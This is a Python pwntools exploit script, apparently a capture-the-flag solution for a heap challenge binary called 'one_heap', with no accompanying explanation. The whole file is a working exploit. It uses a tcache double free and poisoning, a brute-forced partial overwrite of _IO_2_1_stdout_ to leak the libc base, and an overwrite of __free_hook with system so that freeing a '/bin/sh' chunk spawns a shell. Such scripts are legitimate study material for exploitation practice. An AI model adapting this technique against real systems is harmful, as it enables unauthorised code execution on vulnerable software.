#coding=utf-8
from pwn import *
local = 1
context.terminal=["tmux","splitw","-h"]

def debug():
    gdb.attach(a,'''
    b *(0x555555554000+0x000000000000D42)
    b *(0x555555554000+0x000000000000DCD)
    ''')
def menu(index):
    a.recvuntil("Your choice:")
    a.sendline(str(index))
def add(size,content):
    menu(1)
    a.recvuntil("Input the size:")
    a.sendline(str(size))
    a.recvuntil("Input the content:")
    a.send(content)
def delete():
    menu(2)

while 1:
    try:
        a=process("./one_heap")
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
        add(0x78,'A\n')
        delete()
        delete()
        #debug()
        add(0x78,'\x10\x60\n')
        add(0x78,'A\n')
        add(0x78,'\x00'*5+'\xff'*31+'\n')
        delete()
        add(0x48,'A\n')
        add(0x18,'\x60\x57\n')
        payload=p64(0xfbad1800)+p64(0)*3+'\x60\n'
        #debug()
        add(0x38,payload)
        libc_base=u64(a.recvuntil("\x7f")[-6:].ljust(8,'\x00'))-libc.symbols["_IO_2_1_stdout_"]
        success("libc_base ==> 0x%x"%libc_base)
        __free_hook=libc_base+libc.symbols["__free_hook"]
        system_addr=libc_base+libc.symbols["system"]
        #debug()
        add(0x18,p64(__free_hook)+'\n')
        add(0x78,p64(system_addr)+'\n')
        add(0x18,"/bin/sh\x00\n")
        delete()
        a.interactive()
    except :
        a.close
        continue